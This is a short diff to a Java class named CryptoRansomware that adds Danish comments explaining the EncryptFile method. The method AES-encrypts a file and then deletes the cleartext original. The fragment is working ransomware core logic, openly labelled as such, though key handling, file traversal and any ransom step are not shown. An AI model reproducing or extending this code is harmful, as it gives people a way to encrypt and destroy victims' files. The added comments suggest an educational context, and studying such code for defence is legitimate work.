@@ -23,12 +23,17 @@ public class CryptoRansomware {
 
     public static void EncryptFile(final File in, final File out, final SecretKeySpec aeskeySpec) {
         try {
+            // opret og initialiser aes cipher til kryptering af data
             final Cipher aesCipher = Cipher.getInstance(Instance);
             aesCipher.init(Cipher.ENCRYPT_MODE, aeskeySpec, new IvParameterSpec(ivBytes));
 
+            // åben inputfilen til læsning af cleartext data
             FileInputStream is = new FileInputStream(in);
+
+            // åben outputfilen til skrivning af cyphertext data (kryptering foregår her)
             CipherOutputStream os = new CipherOutputStream(new FileOutputStream(out), aesCipher);
 
+            // læs data fra inputfil, krypter dette, og skriv resultatet til outputfil
             copy(is, os);
 
             is.close();
@@ -45,6 +50,7 @@ public class CryptoRansomware {
             e.printStackTrace();
         }
 
+        // slet inputfil (cleartext)
         boolean bool = in.delete();
         System.out.println("File deleted: " + bool);
     }
